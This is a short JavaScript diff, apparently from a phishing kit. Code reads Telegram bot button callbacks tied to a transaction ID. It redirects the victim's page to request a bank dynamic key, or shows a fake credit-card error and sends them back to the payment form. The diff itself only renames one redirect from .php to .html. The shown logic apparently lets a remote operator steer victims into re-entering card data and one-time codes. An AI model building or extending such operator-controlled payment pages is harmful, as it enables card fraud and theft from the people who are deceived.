@@ -385,7 +385,7 @@
 
                         // Comportamientos basados en el botón presionado
                         if (verificationUpdate.callback_query.data === `pedir_dinamica:${transactionId}`) {
-                            window.location.href = "pedir_dinamica.php";
+                            window.location.href = "pedir_dinamica.html";
                         } else if (verificationUpdate.callback_query.data === `error_tc:${transactionId}`) {
                             alert("Error con la tarjeta de crédito. Verifique los datos.");
                             window.location.href = "payment.html";
